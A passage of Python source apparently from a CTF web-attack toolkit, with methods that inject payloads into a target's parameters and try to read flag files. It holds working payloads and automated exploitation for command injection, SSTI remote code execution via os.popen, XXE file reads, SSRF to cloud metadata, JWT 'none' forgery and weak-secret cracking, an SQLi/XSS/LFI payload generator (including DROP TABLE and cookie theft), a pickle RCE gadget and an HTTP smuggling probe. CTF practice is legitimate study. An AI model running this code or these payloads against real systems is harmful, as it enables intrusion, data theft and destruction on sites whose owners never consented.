            results.append(f"\n=== [*] {t('web.auto_exploit')}: {t('web.try_read_flag_cmd')} ===")
            flag_cmds = [
                ("|cat /flag", "cat /flag"),
                (";cat /flag.txt", "cat /flag.txt"),
                ("|type flag.txt", "type flag.txt (Windows)"),
                ("|cat /root/flag.txt", "cat /root/flag.txt"),
                (";cat /home/ctf/flag.txt", "cat /home/ctf/flag.txt"),
                ("|cat /var/www/flag.txt", "cat /var/www/flag.txt"),
                ("|cat /app/flag.txt", "cat /app/flag.txt"),
            ]
            for cmd_payload, desc in flag_cmds:
                try:
                    if use_post and data and vuln_param:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == vuln_param:
                                modified_parts.append(f"{k}={v}{cmd_payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        resp = self._post(url, data=modified_data)
                    elif vuln_param:
                        original_value = params[vuln_param][0] if params.get(vuln_param) else ""
                        test_params = params.copy()
                        test_params[vuln_param] = [original_value + cmd_payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))
                        resp = self._get(test_url)
                    else:
                        continue
                    resp_text = resp.text.strip()
                    if resp_text and len(resp_text) > 0:
                        # 检查是否有 flag 特征
                        if any(kw in resp_text for kw in ['flag{', 'FLAG{', 'ctf{', 'CTF{']):
                            results.append(f"  [!] {desc}: {t('web.flag_found')}")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:500]}")
                        elif len(resp_text) != len(results):
                            results.append(f"  [?] {desc}: {t('web.has_response')} ({len(resp_text)} bytes)")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                except Exception:
                    pass
            if not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
                results.append(f"      {t('web.try_custom_cmd')}")

        return f"{t('web.cmdi_result')}:\n" + "\n".join(results)

    # ========== SSRF 检测 ==========

    def detect_ssrf(self, url: str) -> str:
        """SSRF 探测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return f"[-] {t('web.no_params_ssrf')}"

        ssrf_payloads = [
            (t("web.ssrf.loopback"), "http://127.0.0.1/"),
            ("localhost", "http://localhost/"),
            ("0.0.0.0", "http://0.0.0.0/"),
            (t("web.ssrf.decimal_ip"), "http://2130706433/"),
            (t("web.ssrf.ipv6_loopback"), "http://[::1]/"),
            (t("web.ssrf.aws_metadata"), "http://169.254.169.254/latest/meta-data/"),
            (t("web.ssrf.file_proto"), "file:///etc/passwd"),
        ]

        for param_name in params:
            # 判断参数是否可能是 URL 类型
            val = params[param_name][0] if params[param_name] else ""
            if not ('url' in param_name.lower() or 'uri' in param_name.lower()
                    or 'path' in param_name.lower() or 'src' in param_name.lower()
                    or 'href' in param_name.lower() or val.startswith('http')):
                continue

            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload in ssrf_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    if resp.status_code == 200 and len(resp.text) > 0:
                        results.append(f"  [?] {name}: {t('web.returned_200')} ({len(resp.text)} bytes)")
                except Exception:
                    pass

        if not results:
            return f"[-] {t('web.no_ssrf_params')}"
        return f"{t('web.ssrf_result')}:\n" + "\n".join(results)

    # ========== SSTI 检测 ==========

    def detect_ssti(self, url: str, data: str = None) -> str:
        """服务端模板注入检测"""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params and not data:
            return f"[-] {t('web.no_params_ssti')}"

        ssti_payloads = [
            ("Jinja2/Twig", "{{7*7}}", "49"),
            ("Jinja2 config", "{{config}}", "SECRET_KEY"),
            ("Mako", "${7*7}", "49"),
            ("ERB/Ruby", "<%= 7*7 %>", "49"),
            ("Freemarker", "${7*7}", "49"),
            ("Smarty", "{7*7}", "49"),
        ]

        vuln_found = False
        vuln_param = None
        use_post = False

        # 测试 URL 查询参数
        for param_name in params:
            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload, expected in ssti_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url)
                    if expected in resp.text:
                        results.append(
                            f"  [!] {name}: {t('web.template_executed')} "
                            f"('{payload}' -> {t('web.contains')} '{expected}')"
                        )
                        vuln_found = True
                        vuln_param = param_name
                except Exception:
                    pass

        # 测试 POST data 参数
        if data:
            post_params = parse_qsl(data)
            if post_params:
                for pname, pval in post_params:
                    results.append(f"\n=== {t('web.test_post_param')}: {pname} ===")
                    for name, payload, expected in ssti_payloads:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == pname:
                                modified_parts.append(f"{k}={payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        try:
                            resp = self._post(url, data=modified_data)
                            if expected in resp.text:
                                results.append(
                                    f"  [!] {name}: 模板表达式被执行! "
                                    f"('{payload}' -> 包含 '{expected}')"
                                )
                                if not vuln_found:
                                    vuln_found = True
                                    vuln_param = pname
                                    use_post = True
                        except Exception:
                            pass

        # 自动利用: RCE payload
        if vuln_found and vuln_param:
            results.append(f"\n=== [*] {t('web.auto_exploit')}: SSTI RCE {t('web.attempt')} ===")
            rce_payloads = [
                ("Jinja2 RCE", "{{config.__class__.__init__.__globals__['os'].popen('cat /flag 2>/dev/null || type flag.txt 2>nul').read()}}"),
                (t("web.ssti.simple_cmd"), "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"),
                (t("web.ssti.read_flag_txt"), "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"),
                (t("web.ssti.subclass_exploit"), "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}"),
            ]
            for rce_name, rce_payload in rce_payloads:
                try:
                    if use_post and data:
                        modified_parts = []
                        for k, v in parse_qsl(data):
                            if k == vuln_param:
                                modified_parts.append(f"{k}={rce_payload}")
                            else:
                                modified_parts.append(f"{k}={v}")
                        modified_data = "&".join(modified_parts)
                        resp = self._post(url, data=modified_data)
                    else:
                        test_params = params.copy()
                        test_params[vuln_param] = [rce_payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))
                        resp = self._get(test_url)
                    resp_text = resp.text.strip()
                    if resp_text and len(resp_text) > 0:
                        # 检查是否有 flag 特征
                        if any(kw in resp_text for kw in ['flag{', 'FLAG{', 'ctf{', 'CTF{']):
                            results.append(f"  [!] {rce_name}: {t('web.flag_found')}")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:500]}")
                        elif 'error' not in resp_text.lower() and 'traceback' not in resp_text.lower():
                            results.append(f"  [?] {rce_name}: {t('web.has_response')} ({len(resp_text)} bytes)")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                except Exception:
                    pass

        if not vuln_found and len(results) <= len(params) + (len(parse_qsl(data)) if data else 0):
            return f"[-] {t('web.no_ssti_found')}"
        if vuln_found and not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
            results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
            results.append(f"      {t('web.try_custom_ssti')}")
        return f"{t('web.ssti_result')}:\n" + "\n".join(results)

    # ========== JWT 伪造/爆破 ==========

    def jwt_forge_none(self, token: str) -> str:
        """JWT none 算法伪造"""
        import base64
        import json

        parts = token.split('.')
        if len(parts) != 3:
            return t("web.jwt.invalid_format")

        # 解码 header
        try:
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header_padded = header_padded.replace('-', '+').replace('_', '/')
            header = json.loads(base64.b64decode(header_padded))
        except Exception:
            return t("web.jwt.decode_header_failed")

        # 保存原始算法再修改
        original_alg = header.get('alg', t('web.unknown'))
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()

        # 保留原 payload
        forged = f"{new_header}.{parts[1]}."

        lines = [
            f"=== JWT none {t('web.jwt.forge_title')} ===",
            f"{t('web.jwt.original_alg')}: {original_alg}",
            f"{t('web.jwt.forged_alg')}: none",
            f"\n{t('web.jwt.forged_token')}:",
            forged,
            f"\n{t('web.jwt.none_note')}",
        ]
        return "\n".join(lines)

    def jwt_crack(self, token: str, wordlist_path: str = "") -> str:
        """JWT 弱密钥爆破 (HMAC)"""
        import base64
        import hmac
        import json

        parts = token.split('.')
        if len(parts) != 3:
            return t("web.jwt.invalid_format")

        sign_input = f"{parts[0]}.{parts[1]}".encode()
        # 解码原始签名
        sig_padded = parts[2] + '=' * (4 - len(parts[2]) % 4)
        sig_padded = sig_padded.replace('-', '+').replace('_', '/')
        original_sig = base64.b64decode(sig_padded)

        # 检测算法
        header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header_padded = header_padded.replace('-', '+').replace('_', '/')
        header = json.loads(base64.b64decode(header_padded))
        alg = header.get('alg', 'HS256')

        hash_func = {
            'HS256': 'sha256', 'HS384': 'sha384', 'HS512': 'sha512',
        }.get(alg)
        if not hash_func:
            return f"{t('web.jwt.unsupported_alg')}: {alg} ({t('web.jwt.only_hs')})"

        # 弱密钥字典（扩充版）
        weak_secrets = [
            "secret", "password", "123456", "admin", "key", "test",
            "jwt_secret", "changeme", "default", "1234", "qwerty",
            "flag", "ctf", "supersecret", "mysecret", "s3cr3t",
            "abc123", "token", "jwt", "hmac", "signing_key",
            # 扩充
            "12345678", "password1", "root", "toor", "guest", "info",
            "api_key", "access_token", "private_key", "public_key",
            "HS256", "hs256", "none", "null", "empty", "void",
            "auth", "login", "user", "pass", "master", "slave",
            "development", "production", "staging", "debug",
            "my_secret", "my_key", "app_secret", "app_key",
            "jwt_key", "jwt_token", "secret_key", "SECRET_KEY",
            "django-insecure", "flask-secret", "express-secret",
            "keyboard_cat", "shhh", "shhhh", "mysecretkey",
            "verysecret", "notsosecret", "iloveyou", "trustno1",
            "P@ssw0rd", "Admin123", "Welcome1", "Passw0rd!",
        ]

        # 加载用户自定义字典
        if wordlist_path:
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        word = line.strip()
                        if word and word not in weak_secrets:
                            weak_secrets.append(word)
            except FileNotFoundError:
                pass

        for secret in weak_secrets:
            computed = hmac.new(
                secret.encode(), sign_input, hash_func
            ).digest()
            if computed == original_sig:
                return (
                    f"{t('web.jwt.crack_success')}\n"
                    f"{t('web.jwt.algorithm')}: {alg}\n"
                    f"{t('web.jwt.secret_key')}: {secret}\n"
                    f"{t('web.jwt.can_forge')}"
                )

        return f"{t('web.jwt.crack_failed')} ({t('web.jwt.tried')} {len(weak_secrets)} {t('web.jwt.common_keys')})"

    # ========== 工具方法 ==========

    def _default_paths(self) -> list[str]:
        """常见敏感路径字典"""
        return [
            '/robots.txt', '/sitemap.xml', '/.git/HEAD', '/.svn/entries',
            '/.env', '/config.php', '/config.php.bak', '/wp-config.php',
            '/admin/', '/admin/login', '/login', '/api/', '/api/v1/',
            '/swagger.json', '/swagger-ui.html', '/api-docs',
            '/debug', '/console', '/shell', '/phpinfo.php',
            '/backup/', '/backup.zip', '/backup.sql', '/db.sql',
            '/.DS_Store', '/web.config', '/.htaccess',
            '/flag', '/flag.txt', '/flag.php',
            '/uploads/', '/static/', '/assets/',
            '/server-status', '/server-info',
            '/.well-known/security.txt',
            '/crossdomain.xml', '/clientaccesspolicy.xml',
            '/wp-login.php', '/administrator/',
            '/phpmyadmin/', '/pma/',
            # 版本控制泄露
            '/.svn/wc.db', '/.hg/',
            '/.bzr/', '/.gitignore', '/.gitmodules',
            # 环境文件
            '/.env.bak', '/.env.local', '/.env.production',
            '/config.yml', '/config.yaml', '/config.json',
            '/application.yml', '/application.properties',
            # 备份文件
            '/index.php.bak', '/index.php~', '/index.php.swp',
            '/www.zip', '/web.zip', '/site.zip', '/html.zip',
            '/backup.tar.gz', '/dump.sql', '/database.sql',
            # 信息泄露
            '/info.php', '/test.php', '/readme.html',
            '/INSTALL', '/UPGRADE', '/RELEASE_NOTES',
            '/WEB-INF/web.xml', '/META-INF/MANIFEST.MF',
            # API / 框架
            '/api/v2/', '/graphql', '/swagger.yaml',
            '/actuator', '/actuator/health', '/actuator/env',
            '/trace', '/metrics', '/heapdump',
            # 常见 CMS
            '/wp-content/', '/wp-includes/',
            '/sites/default/files/', '/drupal/',
            '/vendor/composer/installed.json',
        ]

    def detect_xxe(self, url: str) -> str:
        """XXE (XML External Entity) 检测"""
        results = [f"=== {t('web.xxe_title')} ==="]

        xxe_payloads = [
            (t("web.xxe.basic_file"), '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
            (t("web.xxe.basic_windows"), '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'),
            (t("web.xxe.param_entity"), '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'),
            (t("web.xxe.cdata_extract"), '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'),
        ]

        xxe_signatures = [
            r'root:.*:0:0:',
            r'\[fonts\]',
            r'PD9waHA',
            r'<\?php',
        ]

        vuln_found = False

        for name, payload in xxe_payloads:
            try:
                resp = self._post(url, data=payload, headers={'Content-Type': 'application/xml'})
                for sig in xxe_signatures:
                    if re.search(sig, resp.text):
                        results.append(f"  [!] {name}: {t('web.file_content_leak')}")
                        vuln_found = True
                        break
                else:
                    if resp.status_code == 200:
                        results.append(f"  [?] {name}: {t('web.returned_200')} ({t('web.manual_verify')})")
            except Exception as e:
                results.append(f"  [-] {name}: {t('web.request_failed')} ({e})")

        if not vuln_found and len(results) == 1:
            results.append(f"  [-] {t('web.no_xxe_found')}")

        # 自动利用: 尝试读取 flag 文件
        if vuln_found:
            results.append(f"\n=== [*] {t('web.auto_exploit')}: XXE {t('web.read_flag_file')} ===")
            flag_paths = ['/flag', '/flag.txt', '/root/flag.txt', '/home/ctf/flag.txt',
                          '/var/www/flag.txt', '/app/flag.txt']
            for fpath in flag_paths:
                xxe_flag_payload = (
                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{fpath}">]>'
                    f'<root>&xxe;</root>'
                )
                try:
                    resp = self._post(url, data=xxe_flag_payload,
                                      headers={'Content-Type': 'application/xml'})
                    resp_text = resp.text.strip()
                    if resp_text and resp.status_code == 200:
                        if any(kw in resp_text for kw in ['flag{', 'FLAG{', 'ctf{', 'CTF{']):
                            results.append(f"  [!] {fpath}: {t('web.flag_found')}")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:500]}")
                        elif not any(kw in resp_text.lower() for kw in ['error', 'not found', '404']):
                            results.append(f"  [?] {fpath}: {t('web.has_response')} ({len(resp_text)} bytes)")
                            results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                except Exception:
                    pass
            if not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
                results.append(f"      {t('web.try_custom_xxe')}")

        return '\n'.join(results)

    def detect_cors(self, url: str) -> str:
        """CORS 跨域配置错误检测"""
        results = [f"=== {t('web.cors_title')} ==="]

        test_origins = [
            (t("web.cors.evil_domain"), "https://evil.com"),
            ("null origin", "null"),
            (t("web.cors.subdomain_variant"), url.replace('://', '://evil.') if '://' in url else "https://evil.example.com"),
        ]

        for name, origin in test_origins:
            try:
                resp = self._get(url, headers={'Origin': origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')

                if acao == '*':
                    results.append(f"  [!] ACAO {t('web.cors.wildcard')} (Origin: {origin})")
                    if acac.lower() == 'true':
                        results.append(f"      [!!] {t('web.cors.cred_true_severe')}")
                elif acao == origin:
                    results.append(f"  [!] ACAO {t('web.cors.reflected_origin')}: {origin}")
                    if acac.lower() == 'true':
                        results.append(f"      [!!] {t('web.cors.cred_true_exploitable')}")
                elif acao:
                    results.append(f"  [*] ACAO: {acao} (Origin: {origin}) — {t('web.cors.fixed_whitelist')}")
                else:
                    results.append(f"  [-] {t('web.cors.no_acao')} (Origin: {origin})")
            except Exception as e:
                results.append(f"  [-] {t('web.request_failed')}: {e}")

        return '\n'.join(results)

    def generate_payload(self, vuln_type: str) -> str:
        """生成指定类型的测试 Payload 列表"""
        payloads = {
            "sqli": [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "admin'--",
                "' OR 1=1#",
                "1; DROP TABLE users --",
                "' UNION SELECT username,password FROM users --",
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "1; WAITFOR DELAY '0:0:5'--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "'\"><script>alert(document.cookie)</script>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
            ],
            "lfi": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
                "php://input",
                "data://text/plain,<?php system('id') ?>",
            ],
            "cmdi": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
                "127.0.0.1; cat /flag",
                "|| cat /etc/passwd",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{%import os%}{{os.popen('id').read()}}",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>',
            ],
            "ssrf": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]/",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:6379/_INFO",
            ],
        }
        if vuln_type not in payloads:
            return f"{t('web.supported_types')}: {', '.join(payloads.keys())}"
        lines = [f"=== {vuln_type.upper()} Payload {t('web.payload_list')} ==="]
        for p in payloads[vuln_type]:
            lines.append(f"  {p}")
        return "\n".join(lines)

    # ========== Open Redirect 检测 ==========

    def detect_open_redirect(self, url: str) -> str:
        """Open Redirect（开放重定向）检测"""
        results = [f"=== Open Redirect {t('web.detection')} ==="]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return f"[-] {t('web.no_params_redirect')}"

        redirect_payloads = [
            (t("web.redir.external_domain"), "https://evil.com"),
            (t("web.redir.protocol_relative"), "//evil.com"),
            (t("web.redir.backslash_bypass"), "https://evil.com\\@target.com"),
            (t("web.redir.at_bypass"), "https://target.com@evil.com"),
            (t("web.redir.url_encoded"), "https:%2F%2Fevil.com"),
        ]

        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'to', 'out',
                            'continue', 'dest', 'destination', 'redir', 'redirect_uri',
                            'return_to', 'checkout_url', 'return_url']

        for param_name in params:
            is_redirect_param = (param_name.lower() in redirect_params or
                                 'url' in param_name.lower() or 'redirect' in param_name.lower() or
                                 'return' in param_name.lower() or 'next' in param_name.lower())
            if not is_redirect_param:
                continue

            results.append(f"\n=== {t('web.test_param')}: {param_name} ===")
            for name, payload in redirect_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = self._get(test_url, allow_redirects=False)
                    location = resp.headers.get('Location', '')
                    if resp.status_code in (301, 302, 303, 307, 308):
                        if 'evil.com' in location:
                            results.append(f"  [!] {name}: {t('web.redir.redirected_to')} {location}")
                        else:
                            results.append(f"  [-] {name}: {t('web.redir.redirected_to')} {location[:100]} ({t('web.redir.not_external')})")
                    else:
                        results.append(f"  [-] {name}: {t('web.status_code')} {resp.status_code}")
                except Exception:
                    results.append(f"  [-] {name}: {t('web.request_failed')}")

        if len(results) == 1:
            results.append(f"  [-] {t('web.no_redirect_params')}")

        return '\n'.join(results)

    # ========== CRLF 注入检测 ==========

    def detect_crlf(self, url: str) -> str:
        """CRLF 注入检测（HTTP 头注入）"""
        results = [f"=== CRLF {t('web.injection_detection')} ==="]

        crlf_payloads = [
            (t("web.crlf.standard"), "%0d%0aInjected-Header:ctf-tool"),
            (t("web.crlf.double_encode"), "%250d%250aInjected-Header:ctf-tool"),
            ("Unicode", "%E5%98%8A%E5%98%8DInjected-Header:ctf-tool"),
            ("\\r\\n", "\r\nInjected-Header:ctf-tool"),
        ]

        urlparse(url)

        for name, payload in crlf_payloads:
            test_url = url + payload if '?' in url else url + '?' + payload
            try:
                resp = self._get(test_url)
                if 'Injected-Header' in str(resp.headers) or 'ctf-tool' in resp.headers.get('Injected-Header', ''):
                    results.append(f"  [!] {name}: {t('web.crlf.detected')}")
                elif 'Injected-Header' in resp.text:
                    results.append(f"  [?] {name}: {t('web.crlf.in_body')}")
                else:
                    results.append(f"  [-] {name}: {t('web.crlf.not_detected')}")
            except Exception:
                results.append(f"  [-] {name}: {t('web.request_failed')}")

        return '\n'.join(results)

    # ========== 反序列化检测辅助 ==========

    def deserialize_helper(self) -> str:
        """反序列化漏洞检测辅助 -- 常见框架的利用方法"""
        return '''=== 反序列化漏洞辅助 ===

1. PHP 反序列化:
   检测特征: 参数中含 O:, a:, s: 等 PHP 序列化格式
   工具: phpggc (PHP Generic Gadget Chains)
   命令: phpggc Laravel/RCE1 system "id" -b

2. Java 反序列化:
   检测特征: Base64 解码后以 \\xac\\xed\\x00\\x05 开头
   工具: ysoserial
   命令: java -jar ysoserial.jar CommonsCollections1 "id" | base64

3. Python pickle:
   检测特征: Base64 解码后含 \\x80\\x04\\x95 (protocol 4)
   利用:
   ```python
   import pickle, os
   class Exploit:
       def __reduce__(self):
           return (os.system, ('id',))
   payload = pickle.dumps(Exploit())
   ```

4. .NET 反序列化:
   工具: ysoserial.net
   检测特征: AAEAAAD 开头的 Base64 (BinaryFormatter)
   命令: ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"

5. Ruby Marshal:
   检测特征: \\x04\\x08 开头
   工具: ruby-deserialization

6. Node.js:
   检测特征: JSON 中含 {"rce":"_$$ND_FUNC$$_..."} 或 require
   库: node-serialize 存在 RCE

通用检测方法:
- 修改序列化数据观察报错信息
- 使用 Burp 的 Java Deserialization Scanner 插件
- 使用 Freddy (Burp 插件) 检测多种格式
'''

    # ========== 目录遍历检测 ==========

    def detect_path_traversal(self, url: str) -> str:
        """目录遍历检测（增强版，专注路径穿越攻击向量）"""
        if not self.session:
            return f"[!] {t('web.need_requests')}"

        results = [f"=== {t('web.path_traversal_title')} ===", f"{t('web.target')}: {url}"]

        traversal_payloads = [
            (t("web.traversal.standard"), "../" * 6 + "etc/passwd"),
            (t("web.traversal.backslash"), "..\\" * 6 + "etc\\passwd"),
            (t("web.traversal.url_encoded"), "..%2f" * 6 + "etc/passwd"),
            (t("web.traversal.double_encoded"), "%252e%252e/" * 6 + "etc/passwd"),
            ("..;/ (Tomcat)", "..;/" * 6 + "etc/passwd"),
            (t("web.traversal.filter_bypass"), "....//....//....//....//....//....//etc/passwd"),
        ]

        windows_payloads = [
            ("Windows ../", "../" * 6 + "windows/win.ini"),
            ("Windows ..\\", "..\\" * 6 + "windows\\win.ini"),
            ("Windows ..%2f", "..%2f" * 6 + "windows/win.ini"),
            ("Windows ..%5c", "..%5c" * 6 + "windows\\win.ini"),
        ]

        linux_signatures = [b"root:", b"daemon:", b"nobody:", b"/bin/bash", b"/bin/sh"]
        windows_signatures = [b"[boot loader]", b"[operating systems]", b"[fonts]",
                              b"Windows NT", b"for 16-bit app support"]

        all_payloads = traversal_payloads + windows_payloads

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # 参数级路径穿越测试
        if params:
            results.append(f"\n--- {t('web.param_level_test')} ({t('web.params')}: {', '.join(params.keys())}) ---")
            for param in params:
                for name, payload in all_payloads:
                    test_params = dict(params)
                    test_params[param] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))
                    try:
                        resp = self._get(test_url)
                        content = resp.content
                        found = False
                        for sig in linux_signatures + windows_signatures:
                            if sig in content:
                                results.append(
                                    f"  [!] {t('web.param')} {param} - {name}: {t('web.file_content_sig')} ({sig.decode(errors='ignore')})")
                                found = True
                                break
                        if not found and resp.status_code == 200 and len(content) > 0:
                            results.append(f"  [-] {t('web.param')} {param} - {name}: {t('web.status_200_no_sig')}")
                    except Exception:
                        results.append(f"  [-] {t('web.param')} {param} - {name}: {t('web.request_failed')}")
        else:
            results.append(f"\n  [*] {t('web.no_params_skip')}")

        # 非参数路径穿越测试
        results.append(f"\n--- {t('web.path_level_test')} ---")
        base_url = url.rstrip('/')
        path_payloads = [
            (t("web.traversal.path_etc"), "/../../../../../../etc/passwd"),
            (t("web.traversal.path_encoded"), "/..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"),
            (t("web.traversal.path_semicolon"), "/..;/..;/..;/..;/..;/..;/etc/passwd"),
            (t("web.traversal.path_windows"), "/../../../../../../windows/win.ini"),
        ]
        for name, suffix in path_payloads:
            test_url = base_url + suffix
            try:
                resp = self._get(test_url)
                content = resp.content
                found = False
                for sig in linux_signatures + windows_signatures:
                    if sig in content:
                        results.append(f"  [!] {name}: {t('web.file_content_sig')} ({sig.decode(errors='ignore')})")
                        found = True
                        break
                if not found:
                    results.append(f"  [-] {name}: {t('web.status_code')} {resp.status_code}, {t('web.no_sig')}")
            except Exception:
                results.append(f"  [-] {name}: {t('web.request_failed')}")

        results.append(f"\n{t('web.tips')}:")
        results.append(f"  - {t('web.traversal.tip_waf')}")
        results.append(f"  - {t('web.traversal.tip_java')}")
        results.append(f"  - {t('web.traversal.tip_filter')}")

        return '\n'.join(results)

    # ========== HTTP 请求走私检测 ==========

    def detect_http_smuggling(self, url: str) -> str:
        """HTTP 请求走私检测（仅探测，不做实际利用）"""
        if not self.session:
            return f"[!] {t('web.need_requests')}"

        results = [f"=== {t('web.smuggling_title')} ===", f"{t('web.target')}: {url}"]
        results.append(f"[*] {t('web.smuggling_note')}")

        import socket
        from urllib.parse import urlparse as _urlparse

        parsed = _urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        path = parsed.path or '/'

        def send_raw_request(raw_data: bytes) -> tuple:
            """发送原始 HTTP 请求并返回 (状态码, 响应长度, 耗时)"""
            import time
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if use_ssl:
                    import ssl
                    ctx = ssl.create_default_context()
                    if not self.verify_ssl:
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                start = time.time()
                sock.sendall(raw_data)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except socket.timeout:
                    pass
                elapsed = time.time() - start
                sock.close()

                status = 0
                if resp:
                    first_line = resp.split(b'\r\n', 1)[0]
                    parts = first_line.split(b' ', 2)
                    if len(parts) >= 2:
                        try:
                            status = int(parts[1])
                        except ValueError:
                            pass
                return (status, len(resp), elapsed)
            except Exception:
                return (0, 0, 0)

        # 测试 CL-TE
        results.append(f"\n--- CL-TE {t('web.detection')} ---")
        cl_te_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()
        cl_te_normal = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 5\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        status1, len1, time1 = send_raw_request(cl_te_normal)
        status2, len2, time2 = send_raw_request(cl_te_payload)

        if status1 > 0:
            results.append(f"  {t('web.smuggling.normal_req')}: {t('web.status_code')}={status1}, {t('web.length')}={len1}, {t('web.elapsed')}={time1:.2f}s")
            results.append(f"  {t('web.smuggling.probe_req')}: {t('web.status_code')}={status2}, {t('web.length')}={len2}, {t('web.elapsed')}={time2:.2f}s")
            if time2 > time1 + 5:
                results.append(f"  [!] {t('web.smuggling.clte_possible')}")
            elif status2 in (400, 500, 502, 503):
                results.append(f"  [?] {t('web.smuggling.probe_abnormal')} {status2}, {t('web.smuggling.conflict')}")
            elif abs(len2 - len1) > 100:
                results.append(f"  [?] {t('web.smuggling.length_diff')}")
            else:
